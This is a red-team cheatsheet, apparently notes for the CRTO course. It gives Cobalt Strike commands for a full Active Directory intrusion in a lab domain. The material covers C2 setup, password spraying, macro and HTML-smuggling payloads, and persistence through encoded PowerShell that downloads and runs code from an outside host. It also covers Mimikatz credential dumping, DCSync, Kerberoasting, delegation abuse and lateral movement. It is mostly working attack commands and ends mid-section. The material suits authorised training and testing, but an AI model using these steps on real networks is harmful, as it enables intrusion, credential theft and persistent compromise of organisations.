# CRTO Cheatsheet

> 10.10.5.50 = Attacker IP

## C2 - Cobalt Strike

### Run Server

```bash
# Run
/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

### Run as a Service

```bash
sudo vim /etc/systemd/system/teamserver.service

## Paste this
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl enable teamserver.service
```

### Listeners

#### HTTP

Config:

- Beacon HTTP
- HTTP Hosts o HTTP Hosts Stager: `attacker IP`
- Start 80 PORT: `sudo ss -lntp`

#### DNS

Config DNS

|Name |Type | Data |
|----------|----------|----------|
|@ 	|A 	|10.10.5.50|
|ns1 |A  |10.10.5.50|
|pics| NS |ns1.nickelviper.com.|

- DNS Hosts and DNS Hosts (Stager): `Attacker IP`

#### SMB

> `ls \\.\pipe\` to emulate a common name

- Pipename (C2): Input name

#### TCP

- Port (C2): Port 
- Bind to localhost only: optional


#### Pivot Listener

> A pivot listener can only be created on an existing Beacon, and not via the normal Listeners menu

1. Right-click on a Beacon and select Pivoting > Listener.  This will open a "New Listener" window
2. On beacon: `run netstat -anop tcp`
3. We can now generate payloads for this listener

## Initial Compromise

### Outlook

```powershell
Import-Module C:\Tools\MailSniper\MailSniper.ps1
#Enumerate the NetBIOS name 
Invoke-DomainHarvestOWA -ExchHostname mail.test.local
# Get a list of users
./namemash.py names.txt > possible.txt
# timing attack to validate which (if any) of these usernames are valid
Invoke-UsernameHarvestOWA -ExchHostname mail.test.local -Domain <NETBIOS NAME> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
# Password Spraying
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
# Get Address List
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

### Initial Access Payloads

> One significant difference (apart from how you dress it up to the user), is that any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW).

```powershell
## Get Zone data of file
Get-Content .\test.txt -Stream Zone.Identifier
```
The possible zones are:

- 0 => Local computer
- 1 => Local intranet
- 2 => Trusted sites
- 3 => Internet
- 4 => Restricted sites

#### VBA Shell

> Cobalt Strike > Attacks > Scripted Web Delivery > Select Payload 

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell payload here"

End Sub
```

*You save the doc `as .doc` ~~not .docx or .docm~~*

##### Remote Template Injection

Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.

1. Save the document as a dot file
2. 7Zip > Open archive.  Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
3. Change `Target=` to `Target="http://nickelviper.com/template.dot"`

or use this tool

```bash
python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```

#### HTML Smuggling

```bash
cat file | base64
# And modify the file variable and the fileName
```

```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

#### Host Reconnaissance

```bash
# List processes
ps

# Collect Data
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshots
printscreen               ##Take a single screenshot via PrintScr method
screenshot                ##Take a single screenshot
screenwatch               ##Take periodic screenshots of desktop

# Keylogger
keylogger               ## RUn keylogger
jobs                    ## List jobs
jobkill <id>               ## Kill job (keylogger)

# Clipboard
clipboard               ## Get Clipboard

# list the logon sessions on this machine
net logons
```

##### Web Categorization

- https://sitereview.bluecoat.com/
- https://github.com/mdsecactivebreach/Chameleon

## Persistence

> Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons.  Use P2P or DNS Beacons instead.

### SharPersist

- https://github.com/mandiant/SharPersist


* -t is the desired persistence technique.
* -c is the command to execute.
* -a are any arguments for that command.
* -n is the name of the task.
* -m is to add the task (you can also remove, check and list).
* -o is the task frequency.

#### Windows Services

This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.

```bash
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

#### WMI Events

- https://github.com/Sw4mpf0x/PowerLurk

Persistence via WMI events can be achieved by leveraging the following three classes:

* EventConsumer
* EventFilter
* FilterToConsumerBinding


```bash
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
# Remove backdoor
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

#### Task Scheduler

```powershell
# If you generate a powershell payload (Windows)
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

```bash
# If you generate a powershell payload (Linux)
set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```

#### Startup Folder

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
```

#### Registry AutoRun

```bash
# Upload a file.exe to C:|ProgramData\ or another directory and rename to Updater.exe 
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

#### Hunting for COM Hijacks

1. Open Process Monitor
2. Filter Operation is RegOpenKey
3. Result is NAME NOT FOUND
4. Path ends with InprocServer32
5. Find one that's loaded semi-frequently but not so much so or loaded when a commonly used application

Example:

HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32 is loaded by C:\Windows\System32\DllHost.exe

```powershell
Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

> To clean-up a COM hijack, simply remove the registry entries from HKCU and delete the DLL.

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

we can verify that it's currently implemented in HKLM and not HKCU.

```powershell
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
```

## Host Privilege Escalation

### Windows Services

```powershell
#List Services
sc query
Get-Service | fl
```

### Unquoted Service Paths

> When you start the service, you'll see its state will be START_PENDING.  If you then check its status with sc query VulnService1, you'll see it will be STOPPED.  This is by design

> I recommend the use of TCP beacons bound to localhost only for privilege escalations.

```powershell
# Check with SharpU
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
# Manual check
run wmic service get name, pathname
# Get if you have write permission
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```

### Weak Service Permissions

```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
# Change path
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
# Validate changed path
run sc qc VulnService2
run sc stop VulnService2
run sc start VulnService2
```

### Weak Service Binary Permissions

BUILTIN\Users have Modify privileges over Service 

> This allows us to overwrite the binary with something else (make sure you take a backup first).

```powershell
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
download Service 3.exe
copy "tcp-local_x64.svc.exe" "Service 3.exe"
upload C:\Payloads\Service 3.exe
run sc stop VulnService3
upload C:\Payloads\Service 3.exe
run sc start VulnService3
```

### UAC Bypass

- https://github.com/cobalt-strike/ElevateKit

```powershell
whoami /groups
# Medium or High. Medium no Admin and you need bypass UAC, High Admin
beacon> elevate uac-schtasks tcp-local
```

## Credential Theft

### Mimikatz

- The `!` elevates Beacon to SYSTEM before running the given command
- The `@` impersonates Beacon's thread token before running the given command

```bash
beacon> mimikatz token::elevate ; lsadump::sam
beacon> mimikatz !lsadump::sam

#Logon Passwords (lsass)
beacon> mimikatz !sekurlsa::logonpasswords

# Kerberos Encryption Keys
beacon> mimikatz !sekurlsa::ekeys

# SAM
beacon> mimikatz !lsadump::sam

# Domain Cached Credentials
# DCC is orders of magnitude slower to crack than NTLM.
# $DCC2$<iterations>#<username>#<hash>
beacon> mimikatz !lsadump::cache
```

### Extracting Kerberos Tickets

```bash
# List tickets
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Extract specif user ticket
# This will output the ticket(s) in base64 encoded format
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
```

### DCSync

```bash
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
```

## Wordlists

### Rules

```bash
hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule
# or -r /usr/share/hashcat/rules/add-months.rule -r /usr/share/hashcat/rules/add-year.rule
```

### Masks

```bash
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff
```

```bash
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
```

`-1 ?d?s` defines a custom charset (digits and specials)

`?u?l?l?l?l?l?l?l?1` is the mask, where ?1 is the custom charset.

```bash
# Custom
hashcat.exe -a 3 -m 1000 ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
```

Also you can write your file.hcmask

```bash
ZeroPointSecurity?d
ZeroPointSecurity?d?d
ZeroPointSecurity?d?d?d
ZeroPointSecurity?d?d?d?d

# or 
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
```

### Combinator

```bash
# Ejemplo output pass1 pass2. pass1-pass2!
hashcat.exe -a 1 -m 1000 ntlm.txt list1.txt list2.txt -j $- -k $!
```

### Hybrid

`-a 6` specifies the hybrid wordlist + mask mode

`?d?d?d?d` is the mask.

```bash
hashcat.exe -a 6 -m 1000 ntlm.txt list.txt ?d?d?d?d
```

### Kwprocessor

```powershell
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o keywalk.txt
```

## Domain Recon

- https://github.com/PowerShellMafia/PowerSploit
- https://github.com/tevora-threat/SharpView

### PowerView CheatSheet o SharpView

```bash
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
### Runw with powerpick, no detected for AMSI
beacon> powerpick Command
execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

```bash
# Returns a domain object for the current domain or the domain specified with -Domain
beacon> powershell Get-Domain

# Returns the domain controllers for the current or specified domain.
beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl

# Returns all domains for the current forest or the forest specified by -Forest.
beacon> powershell Get-ForestDomain

# Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.
beacon> powershell Get-DomainPolicyData | select -expand SystemAccess

# Return all (or specific) user(s). To only return specific properties, use -Properties. By default, all user objects for the current domain are returned, use -Identity to return a specific user.
# If you run this command without the -Identity parameter, prepare to wait a while for all the data to return.
beacon> powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

# Return all computers or specific computer objects.
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Search for all organization units (OUs) or specific OU objects.
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name

# Return all domain groups or specific domain group objects.
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Return the members of a specific domain group.
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName

# Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use -ComputerIdentity.
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences.
beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

#Enumerates the machines where a specific domain user/group is a member of a specific local group. 
beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

# Return all domain trusts for the current or specified domain.
beacon> powershell Get-DomainTrust
```

### AdSearch

You can add `--json`, `--full` and `--attributes`

```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
```

## User Impersonation

### Pass-the-Hash

```bash
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
# To "drop" impersonation 
beacon> rev2self
```

### Pass the Ticket

is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to,

> a logon session can only hold a single TGT at a time.

```bash
# new hidden process createnetonly
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
# or less anomalous
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
# Import ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

beacon> steal_token 4748
beacon> rev2self
beacon> kill 4748
```

### Overpass the Hash

request a Kerberos TGT for a user

```bash
# RC4
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
# AES256
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap
# OPSEC
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

### Token Impersonation

> This technique works by obtaining a handle to the target process

```bash
# List process
beacon> ps
PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking

# Steal token
beacon> steal_token 5536
```

### Token store

This is an evolution on the steal_token command which allows you to steal and store tokens for future use

> The rev2self command will drop the impersonation token, but it will remain in the store so that it can be impersonated again

```bash
# Steal
beacon> token-store steal 5536
# List
beacon> token-store show
# Use
beacon> token-store use 0
# remove
beacon> token-store remove <id>
# remove all
beacon> token-store remove-all
```

### Make token

> This also means that `make_token` is not applicable to anything you may want to run on the current machine.  For that, `spawnas` may be a better solution.


```bash
beacon> make_token DEV\jking Qwerty123
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
```

### Process Injection

`shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine; and `inject` will inject a full Beacon payload for the specified listener.


* 4464 is the target PID.
* x64 is the architecture of the process.
* tcp-local is the listener name.


```bash
beacon> inject 4464 x64 tcp-local
```

## Lateral Movement

`jump [method] [target] [listener]`

```bash
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

`remote-exec [method] [target] [command]`

```bash
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

```bash
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
```

### Windows Remote Management (WinRM)

```bash
beacon> jump winrm64 web.dev.cyberbotic.io smb
```

### PsExec

```bash
beacon> jump psexec64 web.dev.cyberbotic.io smb
# psexec_psh doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit)
beacon> jump psexec_psh web smb
```

### Windows Management Instrumentation (WMI)

```bash
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

```bash
# Error
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5

beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"
```

### DCOM

```bash
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
# Connect
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

## Session Passing

```bash
beacon> spawn x64 http
```

### Spawn and Inject

shinject and shspawn.  Both allow you to inject an arbitrary shellcode blob - `shinject` can inject into an existing process, and `shspawn` will spawn a new process.

```bash
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
```

## Data Protection API

> DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.

### Credential Manager

```bash
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
# Seatbelt
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
```

#### Decrypt

> This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the @ modifier.

```bash
# Get the master key (ADMIN is required)
beacon> mimikatz !sekurlsa::dpapi
# Anothe way
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
# Decrypt
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

### Scheduled Task Credentials

Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on

```bash
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
beacon> mimikatz !sekurlsa::dpapi
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```

## Kerberos

### Kerberoasting

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

# Select accounts
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

### Asreproast

```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```

### Unconstrained Delegation

> Domain Controllers are always permitted for unconstrained delegation.

#### NO Forced Authentication

```bash
# Find hosts
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
# show all the tickets that are currently cached
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Extract ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
# start a new logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
# Steal token
beacon> steal_token 1540
```

#### Forced Authentication

> To stop Rubeus, use the `jobs` and `jobkill` commands

```bash
# Monitor
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
# Force Dc2=target web=listener
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
# Use ticket
```

### Constrained Delegation

>   Make sure to always use the FQDN.  Otherwise, you will see 1326 errors.

* `/impersonateuser` is the user we want to impersonate.
* `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
* `/user` is the principal allowed to perform the delegation.
* `/ticket` is the TGT for /user.


```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
#   You can also request one with Rubeus asktgt if you have NTLM or AES hashes.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
# Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
# New logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
beacon> steal_token 5540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
# or
beacon> jump psexec64 dc-2.dev.cyberbotic.io smb
```

### Alternate Service Name

We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it happily.

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
beacon> steal_token 2580
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

### S4U2Self Abuse

> In the Unconstrained Delegation module, we obtained a TGT for the domain controller.  If you tried to pass that ticket into a logon session and use it to access the C$ share (like we would with a user TGT), it would fail. This is because `machines do not get remote local admin access to themselves`.  What we can do instead is abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin).  Rubeus has a /self flag for this purpose.

Possible error

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP

[*] Using DEV\DC-2$:FakePass

[*] Showing process : False
[*] Username        : DC-2$
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2832
[+] Ticket successfully imported!
[+] LUID            : 0x4d977f

beacon> steal_token 2832

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

### Resource-Based Constrained Delegation

> You only need a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on the computer object

```bash
#MAQ
